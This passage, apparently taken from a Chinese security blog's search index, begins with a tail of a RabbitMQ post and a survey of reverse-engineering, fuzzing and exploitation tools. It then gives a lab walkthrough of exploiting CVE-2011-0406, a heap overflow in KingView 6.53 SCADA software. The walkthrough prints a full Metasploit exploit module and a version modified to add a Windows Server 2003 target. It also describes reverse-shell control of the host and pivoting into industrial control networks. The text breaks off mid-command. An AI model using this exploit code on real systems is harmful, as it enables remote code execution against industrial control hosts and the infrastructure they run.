＃（hash）可以替代零个或多个单词。\n\n我们可以使用以下示例进行理解：\n\n![image-20200818145608244](https://tva1.sinaimg.cn/large/007S8ZIlly1gi6acwsw56j30ra08wmy4.jpg)","tags":["rabbitMQ"],"categories":["杂项"]},{"title":"常见二进制逆向工具总结","url":"/2019/10/26/漏洞分析工具/","content":"\n## 逆向分析工具\n\n### 预处理工具\n\n1) 脱壳工具\n\n目前有很多加壳工具，当然有盾，自然就有矛。软件脱壳有手动脱和自动脱壳之分，其中手动是用TRW2000、TR、SOFTICE等调试工具对付，对脱壳者有一定水平要求，涉及到很多汇编语言和软件调试方面的知识。自动就是用专门的脱壳工具来脱，最常用某种压缩软件都有编写的反压缩工具对应，有些压缩工具自身能解压，如UPX。有些不提供这功能，如：ASPACK，需要UNASPACK来脱壳。更一般的需要专门的脱壳工具来解决，使用比较多的是PROCDUMP，可解决目前各种主流压缩软件的压缩文件。\n\n<!-- more -->\n\n也就是说脱壳工具一般分为专用的和通用的脱壳机,通用脱壳机是根据外壳的类型或模拟执行进行脱壳,通用脱壳机能脱的壳较多,但是效果不好,专用脱壳机只能针对某一个壳(甚至是某一个壳的具体版本)进行脱壳,虽然它只能脱单一的一种壳,但是由于它的针对性特别强,因此脱壳的效果较好。下面介绍两种通用的脱壳工具：\n\na. linxerUnpacker\n\nlinxerUnpacker是一个通用型自脱工具，由linxer编写发布。它完全基于虚拟机，将壳特征和编译器特征保存在PEid_Sign.txt里面，可以自动脱几十种主流的壳。\n\n![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1oei4qj30os0jon2g.jpg) \n\nb. FFI万能脱壳\n\n本工具是一款辅助进行病毒分析的工具，它包括各种文件格式识别功能，使用超级巡警的格式识别引擎，集查壳、虚拟机脱壳、PE文件编辑、PE文件重建、导入表抓取(内置虚拟机解密某些加密导入表)、进程内存查看/DUMP、附加数据处理、文件地址转换、PEID插件支持、MD5计算以及快捷的第三方工具利用等功能，适合病毒分析中对一些病毒木马样本进行系统处理。\n\n![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1qqmtaj31880ootl6.jpg) \n\n2) 定位地址工具\n\na.Dependency Walker\n\nDependency Walker是一个免费的实用程序，在Windows 95、98，Me，NT，2000，XP，2003，Vista，7和8上运行,可扫描任何32位或64位Windows模块（exe，dll，ocx，sys等），并构建所有从属模块的层次树状图。对于找到的每个模块的地址有巨大的帮助，它列出了该模块导出的所有功能，以及其他模块实际上正在调用的功能。另一个视图显示最少的必需文件集，以及有关每个文件的详细信息，包括文件的完整路径，基地址，版本号，计算机类型，调试信息等。\n\n![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1vweapj313c0u0e3g.jpg) \n\nb.LoadPE\n\nLordPE是一款功能强大的PE文件分析、修改工具，可以查看PE格式文件格式，并修改相关信息。\n\nLordPE可以解析PE文件结构，对PE文件头部结构内容进行查看分析。可以解析各字段特征值的含义，并对特征值进行操作更改。也可以解析PE文件导入导出表结构，分析PE文件的导入函数及导出函数信息。\n\n![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1q9kqqj316k0i811c.jpg) \n\nc.Stud_PE\n\n StudPE是一个功能强大的PE文件格式编辑工具,它可以解析PE文件格式,可以进行文件格式的比较,可以进行壳的识别等。它还提供了支持插件的功能，内置十六进制编辑器，可对资源进行修改。拥有可视化资源查看器，可修改、替换、导出文件；添加函数、修改区段、查看程序进程等等；\n\n \n\n \n\n![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1oxsudj31440u0nf3.jpg) \n\n \n\n3) 地址计算工具\n\na. 逆向工程计算器（Reversers Calculator ）\n\nReversers Calculator 是一个 32 位十六进制基础逆向计算工具，支持十六进制逻辑和数学运算，支持将十六进制和二进制转换为十进制（有/无符号）和八进制结果，并可将字符串转换为十六进制值。\n\n![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1r73yoj30xw0rsamc.jpg) \n\n### 动态分析工具\n\na. Windbg\n\nWinDbg是在windows平台下，强大的用户态和内核态调试工具。它能够通过dmp文件轻松的定位到问题根源，可用于分析蓝屏、程序崩溃（IE崩溃）原因，是我们日常工作中必不可少的一个有力工具，学会使用它，将有效提升我们的问题解决效率和准确率。\n\n![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1pfijpj31bb0u0ww1.jpg) \n\n \n\nc. OllyDbg\n\nOllyDbg（简称OD）是有Oleh Yuschuuk（www.ollydbg.de）编写的一款具有可视化界面的用户模式调试器，可以在当前各种Windows版本上运行，但NT的系统架构更能发挥OllyDbg强大功能。OllyDbg结合了动态调试和静态分析，具有GUI界面，易上手，并且对异常的跟踪处理相当灵活，这些使得OllyDbg成为调试Ring 3级程序的首选工作。它的反汇编引擎很强大，可识别数千个被C和Windows频繁使用的函数，并能将其参数注释出。它会自动分析函数过程、循环语句、代码中的字符串等。\n\n![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1sdvzkj319s0oo7m2.jpg) \n\nd. Immunity Debugger\n\nImmunity Debugger软件专门用于加速漏洞利用程序的开发，辅助漏洞挖掘以及恶意软件分析。它具备一个完整的图形用户界面，同时还配备了迄今为止最为强的Python安全工具库。它巧妙的将动态调试功能与一个强大的静态分析引擎融合于一体，它还附带了一套高度可定制的纯pythont图形算法，可用于帮助我们绘制出直观的函数体控制流以及函数中的各个基本块。\n\n![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1x9j97j312o0b0di0.jpg) \n\n### 静态分析工具\n\na.IDA\n\nIDA Pro（简称IDA）是DataRescue公司出品的一款可编程的交互式反汇编工具和调试器，它的最主要的特性是交互和多处理器。操作者可以通过对IDA的交互来指导IDA更好地反汇编，IDA并非自动解决程序中的问题，但它会按用户的指令找到可疑之处，用户的工作是通知IDA怎样去做。比如人工指定编译器类型，对变量名、结构定义、数组等定义等。这样的交互能力在反汇编大型软件时显得尤为重要。多处理器特点是指IDA支持常见处理器平台上的软件产品，IDA支持的文件类型非常丰富，除了常见的PE格式，还支持Windows,DOS,UNIX,Mac,Java,.NET等平台的文件格式。\n\n![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1ks0pbj316o0pw4df.jpg) \n\nb.Hopper Disassembler\n\nHopper Disassembler是一款适用于Mac与Linux操作系统的软件，它可以帮助你二进制反汇编，反编译和调试32/64位的应用程序。完成集成到OS X环境中，能够进行控制流程图、可脚本化调用、可扩展、调试器、解码器等等功能。![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1lob7ej31970u0ttw.jpg)\n\n \n\n## 漏洞挖掘工具\n\n### 模糊测试类挖掘工具\n\na.Peach\n\nPeach 是一款用 Python 写的开源的 Smart Fuzz 工具， 它支持两种文件 Fuzz 方法:基于生长(Generation Based)和基于变异(Mutation Based)。基于生长的 Fuzz 方法产生随机或启发性数据 来填充给定的数据模型，从而生成畸形文件。而基于变异的 Fuzz 方法在一个给定的样本文件 基础上进行修改从而产生畸形文件。 \n\n![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1ifwfqj31040dkabs.jpg) \n\n \n\n \n\nb.Sully\n\nSulley是一个模糊测试引擎和模糊测试框架，由多个可扩展的组件组成。Sulley（IMHO）所具有的能力超过了以前所发布的大多数模糊测试技术，包括商业工具和那些在公开领域中可用的工具。该框架的目标是不仅要简化数据的表示，而且还要简化数据的传输以及对目标的监视。\n\n![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1js0c0j311c0r8122.jpg) \n\nc.AFL\n\nAFL（American Fuzzy Lop）是由安全研究员Michał Zalewski（[@lcamtuf](https://twitter.com/lcamtuf)）开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。\n\n与其他仪器化的模糊测试器相比，afl的设计更加实用：它具有适度的性能开销，使用各种高效的模糊测试策略和工作量最小化的技巧，基本上不需要配置，并且可以无缝处理复杂的实际用例等优点。\n\n![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1tllq8j31a40n44eo.jpg) \n\nd.AFL-Go\n\nAFLGo是[American Fuzzy Lop（AFL）](https://lcamtuf.coredump.cx/afl/)的扩展。给定一组目标位置（例如folder/file.c:582），AFLGo会生成专门用于执行这些目标位置的目标的输入。与AFL不同，AFLGo的大部分时间预算都花在了到达特定目标位置上，而又不会浪费资源来强调无关的程序组件。\n\n![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1iricjj30yk0p8wlc.jpg) \n\ne.Simple Fuzzer\n\nSimple Fuzzer工具具备全面的模糊测试功能，但使用非常简单。该工具提供一种非常简洁的脚本语言。该语言提供文本模糊字符串和序列模糊字符串两种形式。同时，该语言支持脚本包含等功能，来构建复杂的测试用例。通过该语言，用户来构建测试所用的配置文件。然后，通过Simple Fuzzer加载该文件，就可以对目标实施各种模糊测试。Simple Fuzzer已经集成在了Kali Linux之中，使用起来十分的方便。\n\n![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1ja0r4j316g0ok116.jpg) \n\n \n\n### 符号执行类挖掘工具\n\na. Klee\n\nKLEE是一款开源的自动软件测试工具，英国帝国理工的Cristian Cadar则是符号执行引擎KLEE的作者。它基于LLVM编译底层基础，能够自动生成测试样例检测软件缺陷。与其它工具不同的地方在于，KLEE能对c程序生成字节码.bc文件，并自动生成各类缺陷，不需要再自己编写。因而使用KLEE进行软件测试是比较轻松的方式。\n\n![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1n3np4j30s008kjry.jpg) \n\n \n\nb. Mayhem\n\nMAYHEM，这是一个用于自动查找二进制（即可执行文件）程序中的可利用错误的系统，它是由CMU的David Brumley团队在2012年提出的。MAYHEM会针对所报告的每个错误产生有效的控制劫持漏洞利用，从而确保每个错误报告都是可操作的并且对安全性至关重要。通过使用二进制代码，MAYHEM甚至可以使那些没有源代码访问权限的人也可以检查该软件的安全性。\n\nDavid Brumley后担任ForAllSecure的首席执行官（CEO），Mayhem也借助该公司实现了商业化。\n\n\n\t![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1nyys2j30s008kmy0.jpg)\n\n \n\n\nc. Driller\n\nDriller在afl的基础上开发的crash模糊测试工具。Driller在AFL的基础上加入了动态符号执行引擎，当模糊测试发生stuck时，使用动态符号执行去突破这些限制，生成满足fuzz需求的新输入，使得fuzz能够继续执行。\n\n总体上说，Driller结合了AFL的高效、低消耗、快速的优点和动态符号执行探索能力强的优点，又避免了AFL较难突破特殊的边界和动态符号执行路径爆炸的问题。\n\n![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1l5gh1j30zc0q010i.jpg) \n\nd. Clang\n\nClang是一个由Apple主导编写，基于LLVM的C/C++/Objective-C编译器。它是一个开源工具，其源代码发布于BSD协议之下。本质上，Clang不仅是一个静态分析工具，还是这些语言的一个轻量级编译器。\n\n![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1k9otyj30kg0kg40z.jpg) \n\n## 漏洞分析工具\n\na. BAP\n\n卡内基梅隆大学二进制分析平台（CMU BAP）是一个反向工程和程序分析平台，可以使用二进制代码，并且不需要源代码。 BAP支持多种体系结构：ARM，x86，x86-64，PowerPC和MIPS。 BAP分解二进制代码并将其拆分为类似RISC的BAP指令语言（BIL）。程序分析是使用BIL表示形式执行的，并且与体系结构无关，从某种意义上说，它对于所有支持的体系结构都将同样有效。其包含大量的库，插件和前端。库提供了代码重构，插件有助于扩展，前端作为入口点。该框架用OCaml编写，也可以绑定C，Python和Rust语言。该项目得到了美国国防部，西门子公司和韩国政府的各种资助。\n\n![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1uiersj30xs0q0qal.jpg) \n\n \n\nb. BitBlaze\n\nBitBlaze是一个统一的二进制分析平台, 结合了动态分析和静态分析, 并且具有可扩展性。BitBlaze主要包含3个组件, 分别是Vine、TEMU和Rudder。Vine是静态分析组件, 其将底层指令翻译成简单且规范的中间语言, 并且在中间语言的基础上为一些常见的静态分析提供了实用工具, 如绘制程序依赖关系图、数据流图及程序控制流图等; TEMU是动态分析组件, 其提供了整个系统的动态分析, 并且实现了语义提取和用户定义动态污点分析; Rudder是结合动静态分析的具体执行和符号执行组件, 其使用Vine和TMEU提供的功能在二进制层面上实现了混合具体执行和符号执行, 并且提供了路径选择和约束求解的功能。\n\n![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1m1vzcj313w0b4wh2.jpg) \n\nc. Intel PIN\n\nPin是Intel公司开发的动态二进制插桩框架，可以用于创建基于动态程序分析工具，支持IA-32和x86-64指令集架构，支持windows和linux。\n\n其本身提供的API可以让我们观察一个进程的状态，比如：内存、寄存器和控制流。Pin还提供了一些更改程序行为的机制，比如：允许重写程序的寄存器和内存。\n\n![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1v12wnj307q0420wv.jpg) \n\nd. Triton\n\nTriton是一个使用C++编写功能强大的动态二进制分析（Dynamic Binary Analysis）框架。 基于Taint引擎， 提供良好的Python Binding接口。其主要包含四大组件：（1）符号执行引擎（2）污点分析引擎（3）SMT求解器接口（4）AST representation接口。基于这些组件，我们可以构建用于自动化逆向工程或者漏洞研究的工具。 \n\n![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1mjo1kj30q007kaaw.jpg) \n\ne. BinNavi\n\nBinNavi是一个二进制代码逆向工程的工具，旨在帮助寻找反汇编代码中漏洞的漏洞研究人员。它能够分析输入数据流在程序中的传播路径，通过将程序的控制流图形化表示，从而帮助分析人员定位其感兴趣的执行路径。\n\n使用BinNavi，您可以用其强大的内置静态代码分析技术来分析反汇编的x86，ARM，PowerPC和MIPS代码。如果静态分析仍不够，则可以使用内置调试器来实时查看正在分析的程序。\n\n![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1verthj31a40bctbe.jpg) \n\n## 漏洞利用工具\n\na. Metasploit\n\nMetasploit是当前信息安全与渗透测试领域最为流行的术语之一。它颠覆了原有的渗透测试方法。Metasploit框架是一个开源框架，宗旨就在方便渗透测试，它是由Ruby进行开发编写模块化框架，具有很好的扩展性，便于渗透测试人员进行二次开开发、使用定制的工具模板。\n\nMetasploit可向后端模块提供多种用来控制测试的接口(如控制台、WEB、CLI)。推荐使用控制台接口，通过控制台接口，可以访问和使用所有的Metasploit的插件，例如:Payload、 利用模块、Post模块等。Metasploit还有第三方程序的接口，例如Nmap、SQLmap 等，可以直接在控制台接口里使用，要访问该界面，需要在命令行下输入 msfconsole。\n\n![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1wbitfj30q00643zl.jpg) \n\nb. Mona\n\nMona是一种非常有用的插件，它由Corelan Team用Python编写开发的一个可以自动构造Rop Chain并且集成了metaasploit计算位移量功能的强大挖洞辅助插件。起初是为Immunity Debugger编写的，现在它也适用于WinDbg调试器。\n\n![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1niii7j30uc0h87d9.jpg)  \n\nc. Pompem\n\nPompem是一个开源的漏洞利用和漏洞发现工具，旨在自动在一些重要的漏洞库中搜索漏洞和利用漏洞。在当前版本中，它将在PacketStorm security, CXSecurity, ZeroDay, Vulners, National Vulnerability Database, WPScan Vulnerability Database这些漏洞库中执行搜索。\n\n ![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gehf1wt1lzj315o0icn4q.jpg)","tags":["个人总结"],"categories":["二进制"]},{"title":"（工控向）组态王软件漏洞测试验证与利用","url":"/2019/10/20/（工控向）组态王软件漏洞测试验证与利用/","content":"\n​\t\tWellinTech KingView 6.53 版本中的 HistorySvr.exe 中存在基于堆的缓冲区溢出漏洞。需要掌握远程攻击的方式借助对 TCP 端口 777 的超长请求执行任意代码，实现在 windows 操作员站上的漏洞利用。\n\n<!-- more -->\n\n## 实验原理\n\n### 组态王 KingView\n\n​\t\t亚控科技是国内较早成立的自动化软件企业之一，专注于自主研发、市场营销和服务。 1995 年率先推出组态软件 KingView 系列产品，创立组态王品牌，经过近 20 年的快速发展， 目前公司的产品涵盖设备或工段级监控平台、厂级或集团级监控平台、生产实时智能平台， 产品及方案广泛应用于市政、油气、电力、矿山、物流、汽车、大型设备等行业。\n\n\n​\t\t设备或工段级监控平台即组态王 KingView 系列产品侧重于对各种设备运行状态、某个 工段或生产线运行情况的监视控制，厂级或集团级监控平台即 KingIOServer、KingSCADA、 KingHistria产品侧重于厂级或集团级生产运营情况的全面监控及管理;生产管理平台即 KingFusion 产品则侧重实现产线监控和生产管理的完美结合。\n\n## CVE-2011-0406 \n\n​\t\tCVE-2011-0406 所描述的是亚控组态软件 KingView 6.53 存在的一个缓冲区溢出漏洞, 通过反汇编逆向分析结合动态调试可以发现该漏洞的成因,并可构造攻击代码对其所在上位 机进行攻击,进而获得上位机的远程控制权限。\n\n​\t\t亚控组态软件 KingView 6.53 是运行在 windows 系列操作系统上的组态软件，是亚控 公司推出的一款针对中小型项目推出的用于监视与控制自动化设备和过程的 SCADA 产品, 支持连接 1000 多个厂家近 4000 种设备，支持包括主流 PLC、变频器、仪表、特殊模块、板 卡及电力、楼宇等协议。通过分析发现安装Ki䏰槖iew6.53 软件后，系统会启动 HistorySvr.exe 进程并会以系统服务形式在上位机中运行，该服务会在 TCP 的 777 端口监听接收数据，在 接收到数据后 HistorySvr.exe 程序会有 3 次拷贝操作，前两次各 0x4000 字节，最后一次 0xC 字节，共计 0x800C(32780)字节，在写入缓冲区时，对数据校验不严格导致堆缓冲区溢出 而执行任意代码。通过构造带有 shellcode 的恶意数据包向目标主机的 777 端口进行发送即 可触发该漏洞\n\n​\t\tHistorySvr.exe 进程循环接收业务数据(传感器上报数据)，当接收到 异常格式的业务数据后进行数据处理时没有对数据长度进行严格校验，导致异常数据会覆盖缓冲区空间，当 CPU 按照指针地址执行指令时会跳转到攻击者设计好的 shellcode地址进行执行，导致执行攻击者构造的攻击代码。在实验过程中可以利用meatasploit攻击框架工具构造攻击代码，主要攻击载荷如下:\n\n```ruby\nsploit< < make_nops(1020)\nsploit< < \"\\xC4\\x04\\x2B\\x01\"\nsploit< < payload.encoded\nsploit< < \"x44\"* (31752-payload.encoded.length) \t\nsploit< < [target.ret].pack('V')\n```\n\n​\t\t通过代码可看出数据包前 1020 位使用指令用来占位，接下来 4 位是我们构造的反向连接 shellcode 在内存空间中的地址，后面是加密后的shellcode 代码，然后用(31752-shellcode长度)位的 A 字符来填充补位，最后是用来覆盖 eax 寄存器的跳转地址。\n\n​\t\t通过缓冲区溢出漏洞可覆盖 eax 寄存器的数据，导致程序执行到 call dword ptr[eax+c] 时指针跳转到 shellcode地址进行执行，在实际测试中可以使用metasploit构造不同类型的shellcode，可以构造反向连接类型 shellcode。使用metasploit进行攻击测试的时候需要设置 3 个参数，RHOST为远程上位机IP 地址，RPORT为 HistorySvr.exe 进程监听端口，payload为攻击载荷shellcode。\n\n​\t\t设置好攻击目标及端口，并加载好shellcode 后可以使用 run命令进行攻击测试，攻击成功后会获得反向连接的控制权限，并可使用metasploit自带的工具meterpreter在远程机器上执行系统命令进行远程控制。\n\n​\t\t获得系统权限后可以该上位机为跳板对系统内其他设备进行二次渗透，可窃取系统运行数据、向传感器节点发送控制指令、使用病毒感染系统内网其他服务器，进而危害整个工控系统及基础设施安全。\n\n## **实验环境**\n\n![截屏2019-10-15下午9.17.54](https://tva1.sinaimg.cn/large/006y8mN6ly1g7z76ec19gj30cn02qt8o.jpg)\n\n​\tWindows Server 2003:KingView 6.53\n​\tKali Linux:metasploit、Python等\n\n​\t网卡：Server2003 与Kali桥接为同一网卡\n\n## **实验步骤**\n\n### 实验准备\n\n​\t\t收集 CVE-2011-0406 的信息和 EXP\n\n```ruby\n##\n# $Id$\n##\n\n##\n# This file is part of the Metasploit Framework and may be subject to\n# redistribution and commercial restrictions. Please see the Metasploit\n# Framework web site for more information on licensing and terms of use.\n# http://metasploit.com/framework/\n##\n\nrequire 'msf/core'\n\nclass Metasploit3 < Msf::Exploit::Remote\n\tRank = GoodRanking\n\n\tinclude Msf::Exploit::Remote::Tcp\n\n\tdef initialize(info={})\n\t\tsuper(update_info(info,\n\t\t\t'Name'        => \"Kingview 6.53 SCADA HMI HistorySvr Heap Overflow\",\n\t\t\t'Description' => %q{\n\t\t\t\tThis module exploits a buffer overflow in Kingview 6.53.  By sending a specially\n\t\t\t\tcrafted request to port 777 (HistorySvr.exe), a remote attacker may be able to\n\t\t\t\tgain arbitrary code execution without authentication.\n\t\t\t},\n\t\t\t'License'\t  => MSF_LICENSE,\n\t\t\t'Version'\t  => \"$Revision$\",\n\t\t\t'Author'      =>\n\t\t\t\t[\n\t\t\t\t\t'Dillon Beresford',  #Found by Dillon\n\t\t\t\t\t'rick2600',          #XP SP3 execution\n\t\t\t\t],\n\t\t\t'References' =>\n\t\t\t\t[\n\t\t\t\t\t['CVE', '2011-0406'],\n\t\t\t\t\t['OSVDB', '70366'],\n\t\t\t\t\t['Bugtraq', '45727'],\n\t\t\t\t\t['URL', 'http://www.exploit-db.com/exploits/15957'],\n\t\t\t\t\t['URL', 'http://www.kb.cert.org/vuls/id/180119'],\n\t\t\t\t\t['URL', 'http://thesauceofutterpwnage.blogspot.com/2011/01/waking-up-sleeping-dragon.html'],\n\t\t\t\t],\n\t\t\t'Payload'\t =>\n\t\t\t\t{\n\t\t\t\t\t'BadChars' => \"\\x00\\x0d\\x0a\\xff\"\n\t\t\t\t},\n\t\t\t'Platform' => 'win',\t\n\t\t\t'Targets'\t =>\n\t\t\t\t[\n\t\t\t\t\t[ 'Windows XP SP1', {'Ret' => 0x77ED73B4} ], #UnhandledExceptionFilter() in kernel32.dll\n\t\t\t\t\t[ 'Windows XP SP3 EN', {'Ret' => 0x00A1FB84} ],\n\t\t\t\t],\n\t\t\t'DisclosureDate' => \"9/28/2010\",\n\t\t\t'DefaultTarget' => 0))\n\n\t\t\tregister_options( [ Opt::RPORT(777) ], self.class )\n\tend\n\n\tdef exploit\n\t\tsploit = ''\n\t\tif target.name =~ /XP SP1/\n\n\t\t\tsploit << make_nops(32812)\n\t\t\tsploit << \"\\xEB\\x10\"\n\t\t\tsploit << \"\\x41\"*6\n\t\t\tsploit << \"\\xAD\\xBB\\xC3\\x77\"\n\t\t\tsploit << [target.ret].pack('V')\n\t\t\tsploit << make_nops(8)\n\t\t\tsploit << payload.encoded\n\t\t\tsploit << \"\\x44\"*(1000-payload.encoded.length)\n\t\t\t#this makes the app more crashy, need to investigatev\n\t\t\t#sploit << make_nops(1000-payload.encoded.length) \n\n\t\telsif target.name =~ /XP SP3/\n\n\t\t\tsploit << make_nops(1024)\n\t\t\tsploit << payload.encoded\n\t\t\tsploit << \"\\x44\"*(31752-payload.encoded.length)\n\t\t\t#rand_text_alpha_xxx() unfortunately makes it a bit unstable,\n\t\t\t#not ready to implement\n\t\t\t#sploit << rand_text_alpha_upper(32776-sploit.length)\n\t\t\tsploit << [target.ret].pack('V')\n\n\t\tend\n\n\t\tconnect\n\n\t\tprint_status(\"Trying target #{target.name}\")\n\t\tsock.write(sploit)\n\n\t\tselect(nil, nil, nil, 5)\n\t\thandler\n\t\tdisconnect\n\n\tend\nend\n```\n\n​\t\t将 rb 脚本存放至 metasploit的相应安装目录中进行调用。 例如:/exploits/windows/scada\n\n​\t\t开启 KingView6.53 打开软件预制 Kingdemo 工程。\n\n![截屏2019-10-15下午9.24.03](https://tva1.sinaimg.cn/large/006y8mN6ly1g7z7csvgf1j31h70tb1kx.jpg)\n\n​\t\t确认目标及其 777 端口已经开放，并且防火墙是关闭状态。\n\n![截屏2019-10-15下午3.47.16](https://tva1.sinaimg.cn/large/006y8mN6ly1g7z7eecdghj30jm0awgor.jpg)\n\n### 攻击尝试\n\n​\t\t开启 Kali 安全测试主机作为攻击测试主机，确认msf框架 exploit 攻击代码录入并保存在/usr/share/metasploit-framework/modules/expolits/windows/scada 目录下。\n\n![截屏2019-10-15下午9.29.02](https://tva1.sinaimg.cn/large/006y8mN6ly1g7z7hwlsxij312h0iljtt.jpg)\n\n​\t\t启动metasploit，加载kingview模块\n\n![截屏2019-10-15下午4.53.55](https://tva1.sinaimg.cn/large/006y8mN6ly1g7z7jk1c1sj30p20icwp4.jpg)\n\n​\t\t查看攻击靶机ip地址，置入 RHOST 参数中。进行攻击尝试。\n\n![截屏2019-10-15下午5.21.34](https://tva1.sinaimg.cn/large/006y8mN6ly1g7z7k7ok7cj30p20ich4a.jpg)\n\n​\t\t由于攻击代码中并没有包含 windows Server 2003 版本，因此攻击未成功。\n\n### 分析漏洞\n\n​\t\t我们可以看到目标靶机中的kingview服务已经停止，并且异常调试工具已经启动。\n\n![截屏2019-10-15下午5.39.21](https://tva1.sinaimg.cn/large/006y8mN6ly1g7z7lxgfzcj30m80htgoe.jpg)\n\n​\t\t这表明 HistorySvr.exe 程序中的漏洞已经被触发且产生影响，只是 shellcode 并未在目标靶机中运行，程序执行未跳转到指定 shellcode 位置。\n\n​\t\t通过查看 OllyDbg 中 view—>log，可以看到程序终止在地址为 0x77F47530，异常原因 为 Access violation when reading [00B5084D]。\n\n![截屏2019-10-15下午6.58.20](https://tva1.sinaimg.cn/large/006y8mN6ly1g7z7onss9gj31g30suju7.jpg)\n\n​\t\t观察程序发生异常时执行代码为mov cl, byte ptr  [eax + 5]，即程序将执行该指针位置处的指令，然而该地址值为 0x00B5084D，并未获取到可执行指令。\n\n​\t\t利用代码针对目标为“windows XP SP3 EN”系统的返回地址 Ret 为异常时 EAX 寄存器 的值 0x00B50848。\n\n### 修改利用代码\n\n​\t\t重新打开漏洞利用代码进行编辑，targets 中加入“windows 2003 SP0 EN”，target.name 加入“2003 SP0”，Ret 值暂时随意填写，exploit 函数构造溢出包时，加入定位字符“ABCA” 便于我们定位 payload 地址位置，具体代码如下所示。\n\n```ruby\nrequire 'msf/core'\n\nclass Metasploit3 < Msf::Exploit::Remote\n\tRank = GoodRanking\n\n\tinclude Msf::Exploit::Remote::Tcp\n\n\tdef initialize(info={})\n\t\tsuper(update_info(info,\n\t\t\t'Name'        => \"Kingview 6.53 SCADA HMI HistorySvr Heap Overflow\",\n\t\t\t'Description' => %q{\n\t\t\t\tThis module exploits a buffer overflow in Kingview 6.53.  By sending a specially\n\t\t\t\tcrafted request to port 777 (HistorySvr.exe), a remote attacker may be able to\n\t\t\t\tgain arbitrary code execution without authentication.\n\t\t\t},\n\t\t\t'License'\t  => MSF_LICENSE,\n\t\t\t'Version'\t  => \"$Revision$\",\n\t\t\t'Author'      =>\n\t\t\t\t[\n\t\t\t\t\t'Dillon Beresford',  #Found by Dillon\n\t\t\t\t\t'rick2600',          #XP SP3 execution\n\t\t\t\t],\n\t\t\t'References' =>\n\t\t\t\t[\n\t\t\t\t\t['CVE', '2011-0406'],\n\t\t\t\t\t['OSVDB', '70366'],\n\t\t\t\t\t['Bugtraq', '45727'],\n\t\t\t\t\t['URL', 'http://www.exploit-db.com/exploits/15957'],\n\t\t\t\t\t['URL', 'http://www.kb.cert.org/vuls/id/180119'],\n\t\t\t\t\t['URL', 'http://thesauceofutterpwnage.blogspot.com/2011/01/waking-up-sleeping-dragon.html'],\n\t\t\t\t],\n\t\t\t'Payload'\t =>\n\t\t\t\t{\n\t\t\t\t\t'BadChars' => \"\\x00\\x0d\\x0a\\xff\"\n\t\t\t\t},\n\t\t\t'Platform' => 'win',\t\n\t\t\t'Targets'\t =>\n\t\t\t\t[\n\t\t\t\t\t[ 'Windows XP SP1', {'Ret' => 0x77ED73B4} ], #UnhandledExceptionFilter() in kernel32.dll\n\t\t\t\t\t[ 'Windows XP SP3 EN', {'Ret' => 0x00A1FB84} ],\n\t\t\t\t\t[ 'Windows 2003 SP0 EN', {'Ret' => 0x00B50848} ],#newtarget\n\t\t\t\t],\n\t\t\t'DisclosureDate' => \"9/28/2010\",\n\t\t\t'DefaultTarget' => 0))\n\n\t\t\tregister_options( [ Opt::RPORT(777) ], self.class )\n\tend\n\n\tdef exploit\n\t\tsploit = ''\n\t\tif target.name =~ /XP SP1/\n\n\t\t\tsploit << make_nops(32812)\n\t\t\tsploit << \"\\xEB\\x10\"\n\t\t\tsploit << \"\\x41\"*6\n\t\t\tsploit << \"\\xAD\\xBB\\xC3\\x77\"\n\t\t\tsploit << [target.ret].pack('V')\n\t\t\tsploit << make_nops(8)\n\t\t\tsploit << payload.encoded\n\t\t\tsploit << \"\\x44\"*(1000-payload.encoded.length)\n\t\t\t#this makes the app more crashy, need to investigatev\n\t\t\t#sploit << make_nops(1000-payload.encoded.length) \n\n\t\telsif target.name =~ /XP SP3/\n\n\t\t\tsploit << make_nops(1024)\n\t\t\tsploit << payload.encoded\n\t\t\tsploit << \"\\x44\"*(31752-payload.encoded.length)\n\t\t\t#rand_text_alpha_xxx() unfortunately makes it a bit unstable,\n\t\t\t#not ready to implement\n\t\t\t#sploit << rand_text_alpha_upper(32776-sploit.length)\n\t\t\tsploit << [target.ret].pack('V')\n\t\telsif target.name =~ /2003 SP0/\n\n\t\t\tsploit << make_nops(1020)\n\t\t\tsploit << \"ABCA\"\n\t\t\tsploit << payload.encoded\n\t\t\tsploit << \"\\x44\"*(31752-payload.encoded.length)\n\t\t\tsploit << [target.ret].pack('V')\n\n\n\t\tend\n\n\t\tconnect\n\n\t\tprint_status(\"Trying target #{target.name}\")\n\t\tsock.write(sploit)\n\n\t\tselect(nil, nil, nil, 5)\n\t\thandler\n\t\tdisconnect\n\n\tend\nend\n```\n\n​\t\t进入msf，重新 reaload module，可以看到新加入的目标代码已经加载。\n\n![截屏2019-10-15下午7.06.12](https://tva1.sinaimg.cn/large/006y8mN6ly1g7z80ro7apj31g30sue82.jpg)\n\n​\t\t这里注意，一定要更换攻击方式，由原来的1变为2.\n\n```ruby\n\tset target 